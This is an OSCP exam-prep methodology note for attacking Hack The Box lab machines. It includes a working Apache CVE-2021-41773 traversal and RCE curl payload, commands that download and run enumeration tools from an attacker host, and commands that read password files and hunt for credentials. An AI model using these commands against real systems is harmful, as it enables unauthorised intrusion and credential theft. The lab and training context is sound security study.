---
tags: [oscp-journey, spectre, stage-4, htb, machine-methodology, approach-template]
module: 4
cert-stage: oscp
difficulty: intermediate
date: 2026-04-08
phantom-refs: []
netgod-refs: []
---

# S4-01 — Universal Machine Approach Template

## Why You Need a Rigid Methodology

The biggest difference between someone who passes OSCP and someone who fails is not technical knowledge — it's discipline. Candidates who fail typically do one of these things:

- Jump to exploitation before finishing enumeration
- Get fixated on one attack vector and ignore others
- Skip phases when they think they've "found it"
- Take poor notes and can't reconstruct their steps for the report
- Spend 3 hours on the wrong vector because they didn't time-box

A rigid methodology forces you to be systematic. Every machine gets the same treatment regardless of how confident you feel about a particular attack path. The methodology is what you fall back on when you're stuck.

---

## The Seven Phases — Every Machine, Every Time

```
Phase 1 → Recon (simultaneous scans)
Phase 2 → Service Enumeration (per-port)
Phase 3 → Attack Planning (before touching anything)
Phase 4 → Exploitation (with documentation)
Phase 5 → Post-Foothold (immediate situational awareness)
Phase 6 → Privilege Escalation (systematic, not random)
Phase 7 → Documentation (screenshots and proof)
```

Never skip a phase. Never reorder them. The discipline is the point.

---

## Phase 1 — Initial Recon

Start all three scans the moment you know a machine's IP. Do not wait for one to finish before starting the next.

### The Three Simultaneous Scans

**Terminal 1 — Quick scan (start enumerating results immediately):**
```bash
nmap -sC -sV -T4 --min-rate 5000 -Pn -oA /path/to/notes/quick TARGET_IP
```

**Terminal 2 — Full port scan (critical — catches non-standard ports):**
```bash
nmap -p- -T4 --min-rate 5000 -Pn -oA /path/to/notes/full TARGET_IP
```

**Terminal 3 — UDP scan (run in background — takes longest):**
```bash
nmap -sU --top-ports 100 -Pn -oA /path/to/notes/udp TARGET_IP
```

**While scans run — begin passively:**
- Read any lab documentation or machine description
- Note the machine name and any hints about the environment
- Check if the machine is Windows or Linux from quick scan results as they come in

### Targeted Script Scan — After Full Port Scan Completes

```bash
# Extract all open ports from full scan:
ports=$(grep "open" /path/to/notes/full.gnmap | grep -oP "\d+/open" | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')

# Run targeted NSE scripts on all open ports:
nmap -sC -sV -p$ports -Pn -oA /path/to/notes/targeted TARGET_IP
```

### Reading Nmap Output — What to Note

For every open port, record:
- Port number and protocol (TCP/UDP)
- Service name
- Version (exact version string — this is what you searchsploit)
- Any information from default scripts (-sC)

**Template for each port:**
```
Port 80/tcp — Apache httpd 2.4.49 (Ubuntu)
  → searchsploit apache 2.4.49 ✓
  → gobuster launched: common.txt + .php,.html,.txt
  → robots.txt: /admin (noted)

Port 445/tcp — Samba smbd 4.9.5
  → searchsploit samba 4.9.5
  → smbmap -H TARGET: null session denied
  → enum4linux running in background
```

---

## Phase 2 — Service Enumeration

For every port found, run the appropriate enumeration immediately. Don't wait — start all enumerations in parallel as each port appears in the quick scan.

### The Per-Service Checklist

**FTP (21):**
```bash
ftp TARGET         # Test anonymous login
nmap --script ftp-anon -p21 TARGET
wget -r ftp://anonymous:@TARGET    # Recursive download if anon works
searchsploit [SERVICE_AND_VERSION]
```

**SSH (22):**
```bash
nc -nv TARGET 22   # Banner grab — note exact version
searchsploit openssh [VERSION]
# Don't brute force yet — note for later if creds found elsewhere
```

**SMTP (25):**
```bash
nc TARGET 25
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t TARGET
```

**DNS (53):**
```bash
dig axfr @TARGET domain.local
dnsrecon -d [DOMAIN] -t axfr
```

**HTTP/HTTPS (80/443/8080/8443):**
```bash
# Always run simultaneously — don't wait for one to finish:
whatweb http://TARGET
curl -I http://TARGET
curl http://TARGET/robots.txt
curl http://TARGET/.git/HEAD
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak -t 50 -o gobuster_common.txt &
nikto -h http://TARGET &
# Start medium wordlist in background after:
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt -t 50 -o gobuster_medium.txt &
```

**SMB (139/445):**
```bash
smbmap -H TARGET
smbclient -L //TARGET -N
enum4linux-ng TARGET
nmap --script smb-vuln-ms17-010 -p445 TARGET
nmap --script smb2-security-mode -p445 TARGET
```

**SNMP (161 UDP):**
```bash
onesixtyone TARGET public
snmpwalk -v2c -c public TARGET
snmp-check TARGET -c public
```

**MySQL (3306):**
```bash
mysql -h TARGET -u root -p    # Try blank password
nmap --script mysql-empty-password -p3306 TARGET
```

**MSSQL (1433):**
```bash
impacket-mssqlclient sa@TARGET    # Try blank password
nmap --script ms-sql-empty-password -p1433 TARGET
```

**RDP (3389):**
```bash
nmap --script rdp-enum-encryption -p3389 TARGET
# Note version — check for BlueKeep if old Windows
```

**WinRM (5985):**
```bash
# Note it's open — attempt with any credentials found
evil-winrm -i TARGET -u admin -p password
```

**Tomcat (8080):**
```bash
gobuster dir -u http://TARGET:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Look for /manager/html — try default creds
```

---

## Phase 3 — Attack Planning

**Do this before touching any exploit.** This is the most underrated phase.

Write down — in your notes — the following:

```
ATTACK PLAN — TARGET_IP

Highest confidence vectors:
1. Apache 2.4.49 — CVE-2021-41773 path traversal/RCE
   Reason: Exact version match, public PoC exists, service running as www-data
   Expected result: Unauthenticated RCE → shell as www-data
   Next step after: LinPEAS, then look for web config files with creds

2. FTP anonymous — can read but not write
   Reason: Confirmed anonymous login, found backup.zip in /pub/
   Expected result: Config file with credentials inside zip
   Next step after: Extract zip, look for DB creds, try against web login

Lower confidence vectors (if above fail):
3. SSH brute force with found usernames
4. Web application manual testing for SQLi in login form
```

**The rabbit hole test:** Before spending time on anything, ask:
- Does this lead to a shell, a credential, or a file?
- If not → skip it

**The 25-minute rule:** If you have been on the same vector for 25 minutes with zero progress, stop. Document what you tried. Move to the next vector. Return later with fresh eyes.

---

## Phase 4 — Exploitation

**Rule:** Always attempt manual exploitation before automated tools.

### Exploit Research Workflow

```bash
# For every service/version found:
searchsploit [SERVICE] [VERSION]
searchsploit CVE-[YEAR]-[NUMBER]

# If Metasploit module exists — note it but try manual first:
# search [service] in msfconsole → note module name

# Find manual PoC:
# site:github.com CVE-YEAR-NUMBER exploit
# site:exploit-db.com [service] [version]
```

### Before Running Any Exploit

Checklist:
- [ ] Read the exploit code — what does it do?
- [ ] What is LHOST set to? Is it your tun0 IP?
- [ ] What port does it use? Is your listener running?
- [ ] Does it need modification for your target?
- [ ] Is the target version actually vulnerable? (not just "maybe")

### Listener First, Exploit Second

```bash
# Always start listener BEFORE triggering exploit:
nc -lvnp 4444 &    # Run in background or separate terminal

# Then trigger the exploit
```

### Document Every Attempt

In your notes, write:
```
Attempt 1: CVE-2021-41773
  Command: curl -s --path-as-is "http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
  Result: File contents returned — LFI confirmed
  
Attempt 2: RCE via CVE-2021-41773
  Command: curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
  Result: uid=33(www-data) gid=33(www-data) — RCE confirmed
  
Attempt 3: Reverse shell
  Command: curl with bash reverse shell payload
  Result: Shell received on nc -lvnp 4444
```

---

## Phase 5 — Post-Foothold (First 60 Seconds)

Run these immediately every time — before anything else:

### Linux Post-Foothold — Muscle Memory

```bash
whoami && id && hostname && uname -a
ip a
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/
cat /etc/hosts
ls -la /root/ 2>/dev/null
ls /.dockerenv 2>/dev/null    # Am I in a container?
```

**Then immediately — upgrade the shell:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 38 columns 116
```

**Then start automated enumeration in background:**
```bash
# Upload and run LinPEAS:
wget http://ATTACKER_IP/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
/tmp/lp.sh 2>/dev/null | tee /tmp/lp_out.txt &

# Upload and run pspy64:
wget http://ATTACKER_IP/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy
/tmp/pspy &

# Read LinPEAS output while it runs:
tail -f /tmp/lp_out.txt
```

### Windows Post-Foothold — Muscle Memory

```cmd
whoami /all
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all
net user
net localgroup administrators
cmdkey /list
```

**Then immediately — check the highest-value privilege:**
```cmd
whoami /priv
# SeImpersonatePrivilege present? → PrintSpoofer or GodPotato right now
```

**Then start WinPEAS:**
```cmd
certutil -urlcache -split -f http://ATTACKER_IP/winPEASx64.exe C:\Temp\wp.exe
C:\Temp\wp.exe > C:\Temp\wp_out.txt 2>&1
```

---

## Phase 6 — Privilege Escalation

**Never guess.** Enumerate first, then exploit the specific finding.

### Linux PrivEsc Order

```
1. sudo -l → GTFOBins (30 seconds)
2. Read LinPEAS red/yellow findings (10 minutes)
3. SUID: find / -perm -4000 -type f 2>/dev/null → GTFOBins
4. Capabilities: getcap -r / 2>/dev/null
5. Cron: cat /etc/crontab; pspy64 for 5 minutes
6. Writable /etc/passwd: ls -la /etc/passwd
7. Config files with creds: grep -r "password" /var/www/
8. Internal services: ss -tulpn | grep 127
9. NFS: showmount -e TARGET; cat /etc/exports
10. Kernel: uname -r → searchsploit
```

### Windows PrivEsc Order

```
1. whoami /priv → SeImpersonatePrivilege? → PrintSpoofer/GodPotato (30 seconds)
2. Read WinPEAS red findings
3. AlwaysInstallElevated: 2 reg queries (30 seconds)
4. cmdkey /list → saved credentials
5. Unquoted paths: wmic service get name,pathname | findstr /i auto
6. Service binary permissions: accesschk -uwcqv "Authenticated Users" *
7. Registry passwords: reg query HKLM /f password /t REG_SZ /s
8. PowerShell history: type $env:APPDATA\...\ConsoleHost_history.txt
9. Scheduled tasks: schtasks /query /fo LIST /v
10. Kernel: systeminfo → wmic qfe list → searchsploit
```

---

## Phase 7 — Documentation (During and After)

**Take these screenshots at every key step — not just at the end:**

| Moment | What to Screenshot |
|--------|-------------------|
| After Nmap | The open ports summary |
| After finding vulnerability | The output confirming it |
| When exploit runs | The command and initial output |
| When shell received | The connection showing in your listener |
| First command in shell | `whoami` output |
| After PrivEsc | `whoami` showing elevated user |
| **Proof** | **hostname + whoami + cat flag.txt — ALL IN ONE IMAGE** |

**Proof screenshot command — always use this:**
```bash
# Linux:
hostname; whoami; cat /root/root.txt

# Windows:
hostname && whoami && type C:\Users\Administrator\Desktop\root.txt
```

**CherryTree note structure per machine:**
```
[Machine IP]
├── Recon
│   ├── Nmap Quick [paste output]
│   ├── Nmap Full [paste output]
│   └── UDP [paste output]
├── Enumeration
│   ├── Port 80 [notes + gobuster output]
│   ├── Port 445 [notes + enum4linux output]
│   └── [other ports]
├── Exploitation
│   ├── Vulnerability: [NAME + CVE]
│   ├── Commands used: [exact commands]
│   └── Shell obtained as: [user]
├── PrivEsc
│   ├── Vector: [technique]
│   ├── Commands used: [exact commands]
│   └── Root obtained as: [root/SYSTEM]
└── Proof
    ├── user.txt: [hash value]
    ├── root.txt: [hash value]
    └── Screenshot: machine_root.png ✓
```

---

## The Time Management Heuristics

**The 25-minute rule:**
If you've been on the same attack vector for 25 minutes with no measurable progress — document what you tried and switch to the next vector. Write: "Spent 25 min on X, tried A, B, C — no progress. Moving to Y."

**The rabbit hole test:**
Before investing time in any direction, ask: "If this works, what do I have?" If the answer is "a page that loads differently" or "confirmation that X exists" — it's a rabbit hole unless it directly leads to a shell, credential, or sensitive file.

**The parallel work principle:**
While any scan or automated tool is running, you should be manually working something else. Nmap full scan running → manually enumerate the ports from the quick scan. LinPEAS running → manually check sudo/SUID. Never wait idle.

**The difficulty-appropriate time budget:**
| Machine difficulty | Total time | PrivEsc budget | If stuck at |
|-------------------|-----------|----------------|------------|
| Easy | 60 min | 20 min | 45 min → move on |
| Medium | 90 min | 30 min | 70 min → move on |
| Hard | 120 min | 45 min | 90 min → move on |

---

## Quick Reference — Commands to Have Ready

```bash
# RECON
nmap -sC -sV -T4 --min-rate 5000 -Pn -oA quick TARGET
nmap -p- -T4 --min-rate 5000 -Pn -oA full TARGET &
nmap -sU --top-ports 100 -Pn -oA udp TARGET &

# WEB
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50
whatweb http://TARGET
curl -I http://TARGET && curl http://TARGET/robots.txt

# SMB
smbmap -H TARGET && enum4linux-ng TARGET
nmap --script smb-vuln-ms17-010 -p445 TARGET

# SHELL UPGRADE
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# LINUX PRIVESC
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab

# WINDOWS PRIVESC
whoami /priv
crackmapexec smb TARGET -u user -p pass --local-auth
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# TOOLS TRANSFER
python3 -m http.server 80    # Kali
wget http://KALI_IP/tool -O /tmp/tool    # Linux target
certutil -urlcache -split -f http://KALI_IP/tool.exe C:\Temp\tool.exe    # Windows target
```

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| HTB — Lame | Apply this template: recon → SMB CVE → root (no PrivEsc needed) |
| HTB — Blue | Template: recon → EternalBlue → SYSTEM |
| HTB — Bashed | Template: recon → web shell → sudo PrivEsc |
| HTB — Nibbles | Template: recon → web app → upload → sudo |
| HTB — Jerry | Template: recon → Tomcat → WAR deploy → SYSTEM |
| TryHackMe — "Methodology" rooms | Practice the methodology with guided machines |
| OSCP Lab machines | Apply this EXACT template to every lab machine |
